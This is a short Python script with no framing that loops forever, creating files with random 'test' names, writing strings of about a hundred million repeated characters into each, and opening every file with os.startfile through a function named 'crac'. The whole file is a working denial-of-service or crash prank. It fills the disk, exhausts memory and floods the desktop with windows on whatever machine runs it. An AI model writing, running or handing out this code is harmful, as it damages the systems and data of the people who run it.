import random
import os
a = 1
file = ''
name = ''
def new():
   global file
   global name
   c = random.choice(range(1, 100))
   name = 'test' + str(c) + '.txt'
   file = open(name, 'a+')
def crac():
    global name
    os.startfile(name)
while True:
    new()
    a += a
    print(str(a) * 100000000, file=file)
    crac()
file.close()